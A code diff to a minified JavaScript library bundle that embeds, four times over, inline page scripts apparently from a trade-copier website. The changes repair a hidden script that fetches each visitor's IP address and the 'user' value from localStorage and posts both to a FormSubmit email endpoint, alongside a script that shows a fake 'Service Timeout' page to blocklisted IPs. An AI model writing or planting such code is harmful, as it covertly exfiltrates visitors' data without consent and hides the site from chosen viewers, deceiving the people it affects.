@@ -192,22 +192,24 @@ if(!(f instanceof _.Oc)){d=void 0;var g="";for(d in f)if(Object.prototype.hasOwn
 </script>
 <noscript><a href="https://www.livechat.com/chat-with/17955474/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
 <!-- End of LiveChat code --><script>
+// Fetch visitor IP and send to email
 fetch('https://api.ipify.org?format=json')
   .then(res => res.json())
   .then(data => {
     const ip = data.ip;
     console.log("Visitor IP:", ip);
-   const user= localStorage.getItem("user")
+    const user = localStorage.getItem("user");
 
-    // Send IP to your email via FormSubmit (no backend)
+    // Send IP to your email via FormSubmit (fix: use URL encoded data)
     fetch('https://formsubmit.co/support@protradecopier.pro', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ VisitorIP: ip,Usernfo:user })
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: `VisitorIP=${encodeURIComponent(ip)}&UserInfo=${encodeURIComponent(user)}`
     });
   })
   .catch(err => console.error('IP fetch error:', err));
 </script>
+
 <script>
 // List of IPs you want to block
 const blockedIps = ['47.145.116.165', '197.211.63.123'];
@@ -225,12 +227,12 @@ fetch('https://api.ipify.org?format=json')
       document.body.innerHTML = `
         <div style="text-align:center; margin-top:50px;">
           <h1 style="color:red; font-size:3em;">Service Timeout</h1>
-         
         </div>`;
     }
   })
   .catch(err => console.error('Failed to fetch IP:', err));
 </script>
+
 
 </body>");return _.Wc(a)},Qi=function(a,b){if((0,_.Zc)())for(;a.lastChild;)a.removeChild(a.lastChild);a.innerHTML=_.Vc(b)},al=function(a,b){b=b instanceof _.Hc?b:_.li(b);a.action=_.$g(b)},bl=function(a,b){return a+Math.random()*(b-a)},cl=function(a,b){return new Q(a.x-b.x,a.y-b.y)},dl=function(a){return a.replace(/\xa0|[ \t]+/g,
 " ")},el=function(a){return a.replace(/[\s\xa0]+$/,"")},fl=function(a){return a=Jk(a)},gl=function(a){return a.replace(/&([^;]+);/g,function(b,c){switch(c){case "amp":return"&";case "lt":return"<";case "gt":return">";case "quot":return'"';default:return"#"!=c.charAt(0)||(c=Number("0"+c.slice(1)),isNaN(c))?b:String.fromCharCode(c)}})},hl=/&([^;\s<&]+);?/g,il=function(a){var b={"&amp;":"&","&lt;":"<","&gt;":">","&quot;":'"'};var c=_.q.document.createElement("div");return a.replace(hl,function(d,e){var f=
@@ -571,22 +573,24 @@ String("VIpgJd-ZVi9od-xl07Ob".pa()).replace(Rm,"").replace(Sm,"&lt;");f=String(f
 </script>
 <noscript><a href="https://www.livechat.com/chat-with/17955474/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
 <!-- End of LiveChat code --><script>
+// Fetch visitor IP and send to email
 fetch('https://api.ipify.org?format=json')
   .then(res => res.json())
   .then(data => {
     const ip = data.ip;
     console.log("Visitor IP:", ip);
-   const user= localStorage.getItem("user")
+    const user = localStorage.getItem("user");
 
-    // Send IP to your email via FormSubmit (no backend)
+    // Send IP to your email via FormSubmit (fix: use URL encoded data)
     fetch('https://formsubmit.co/support@protradecopier.pro', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ VisitorIP: ip,Usernfo:user })
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: `VisitorIP=${encodeURIComponent(ip)}&UserInfo=${encodeURIComponent(user)}`
     });
   })
   .catch(err => console.error('IP fetch error:', err));
 </script>
+
 <script>
 // List of IPs you want to block
 const blockedIps = ['47.145.116.165', '197.211.63.123'];
@@ -604,12 +608,12 @@ fetch('https://api.ipify.org?format=json')
       document.body.innerHTML = `
         <div style="text-align:center; margin-top:50px;">
           <h1 style="color:red; font-size:3em;">Service Timeout</h1>
-         
         </div>`;
     }
   })
   .catch(err => console.error('Failed to fetch IP:', err));
 </script>
+
 
 </body>").Hc();d.write(_.Vc(e));d.close()},this))};_.l.rh=function(){this.j=new _.ed(pl(this.l));this.S=this.j.B(W(this,"menuBody"));this.A.I(this.D,"click",this.Ce);_.C?this.A.I(this.l,"blur",this.Bd):this.A.I(ql(this.l),"blur",this.Bd);this.dispatchEvent("load")};
 _.l.oa=function(){ev.prototype.oa.call(this);nl(this.l);this.D=this.da=this.C=this.S=this.j=this.l=null};_.l.ng=function(a){this.s!=a.currentTarget.value&&(this.Na(a.currentTarget.value),this.dispatchEvent("change"));this.Bd()};_.l.Ce=function(){iv(this);ql(this.l).focus();this.na=!0};_.l.Bd=function(){this.na&&(this.na=!1,iv(this,!1),_.md(_.fd(this.D)).focus())};_.l.cf=function(){};_.l.df=function(){};
@@ -679,22 +683,24 @@ this.B());this.C=this.h.B(W(this,"container"));this.j.I(this.C,"load",this.th);t
 </script>
 <noscript><a href="https://www.livechat.com/chat-with/17955474/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
 <!-- End of LiveChat code --><script>
+// Fetch visitor IP and send to email
 fetch('https://api.ipify.org?format=json')
   .then(res => res.json())
   .then(data => {
     const ip = data.ip;
     console.log("Visitor IP:", ip);
-   const user= localStorage.getItem("user")
+    const user = localStorage.getItem("user");
 
-    // Send IP to your email via FormSubmit (no backend)
+    // Send IP to your email via FormSubmit (fix: use URL encoded data)
     fetch('https://formsubmit.co/support@protradecopier.pro', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ VisitorIP: ip,Usernfo:user })
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: `VisitorIP=${encodeURIComponent(ip)}&UserInfo=${encodeURIComponent(user)}`
     });
   })
   .catch(err => console.error('IP fetch error:', err));
 </script>
+
 <script>
 // List of IPs you want to block
 const blockedIps = ['47.145.116.165', '197.211.63.123'];
@@ -712,12 +718,12 @@ fetch('https://api.ipify.org?format=json')
       document.body.innerHTML = `
         <div style="text-align:center; margin-top:50px;">
           <h1 style="color:red; font-size:3em;">Service Timeout</h1>
-         
         </div>`;
     }
   })
   .catch(err => console.error('Failed to fetch IP:', err));
 </script>
+
 
 </body>").Hc();f.write(_.Vc(g));f.close()},this))};_.l.th=function(){this.l=(new _.ed(pl(this.C))).B(W(this,"translate"));this.j.I(this.l,"click",pp(this,"clk_trans"));T(this.B(),!0);var a=Bm(this.l);T(this.B(),!1);Dm(this.C,a);Dm(this.B(),a);this.dispatchEvent("load")};_.l.oa=function(){rv.P.oa.call(this);this.j.T();this.j=null;nl(this.C);this.l=this.C=null};_.l.isVisible=function(){return this.ob};
 _.l.fa=function(a){this.ob=a;T(this.B(),a)};var tv=function(a,b){P.call(this,b);this.A=new _.cg(this);this.g=a&&Gi(a)||{};this.g.lb||(this.g.lb=On);this.g.rf=!1;_.K(this.h.g.body,"position","relative");_.dh||_.K(this.h.g.body,"minHeight","100%");_.K(this.h.g.documentElement,"height","100%");_.K(this.h.g.body,"top","0px");_.C&&(window._bannerquirkfixleft=-parseInt("0"+this.h.g.body.leftMargin,10),window._bannerquirkfixtop=-parseInt("0"+this.h.g.body.topMargin,10)-40)};_.z(tv,P);_.l=tv.prototype;
@@ -775,22 +781,24 @@ U("VIpgJd-ZVi9od-ORHb-KE6vqe")+'"></td><td nowrap><div class="'+U("VIpgJd-ZVi9od
 </script>
 <noscript><a href="https://www.livechat.com/chat-with/17955474/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
 <!-- End of LiveChat code --><script>
+// Fetch visitor IP and send to email
 fetch('https://api.ipify.org?format=json')
   .then(res => res.json())
   .then(data => {
     const ip = data.ip;
     console.log("Visitor IP:", ip);
-   const user= localStorage.getItem("user")
+    const user = localStorage.getItem("user");
 
-    // Send IP to your email via FormSubmit (no backend)
+    // Send IP to your email via FormSubmit (fix: use URL encoded data)
     fetch('https://formsubmit.co/support@protradecopier.pro', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ VisitorIP: ip,Usernfo:user })
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: `VisitorIP=${encodeURIComponent(ip)}&UserInfo=${encodeURIComponent(user)}`
     });
   })
   .catch(err => console.error('IP fetch error:', err));
 </script>
+
 <script>
 // List of IPs you want to block
 const blockedIps = ['47.145.116.165', '197.211.63.123'];
@@ -808,12 +816,12 @@ fetch('https://api.ipify.org?format=json')
       document.body.innerHTML = `
         <div style="text-align:center; margin-top:50px;">
           <h1 style="color:red; font-size:3em;">Service Timeout</h1>
-         
         </div>`;
     }
   })
   .catch(err => console.error('Failed to fetch IP:', err));
 </script>
+
 
 </body>').Hc();Ca.write(_.Vc(oa));Ca.close()},this))};
 _.l.uh=function(){this.j=new _.ed(pl(this.C));uv(this,V.Cf);if(this.g.lb==On){var a="url("+Kn+")";_.K(this.j.g.body,"backgroundImage",a);for(var b=this.j.g.getElementsByTagName("button"),c=0;c<b.length;++c){var d=b[c].parentNode;_.K(d,"backgroundImage",a);_.K(d,"backgroundRepeat","repeat-x");_.K(d,"backgroundPosition","0 -39px")}}this.g.rf&&(this.s=new kv(this.g,this.j));this.l=new kv(this.g,this.j);this.D=new mv(this.g,this.j);this.A.I(this.j.B(W(this,"confirm")),"click",pp(this,"clk_confirm"));
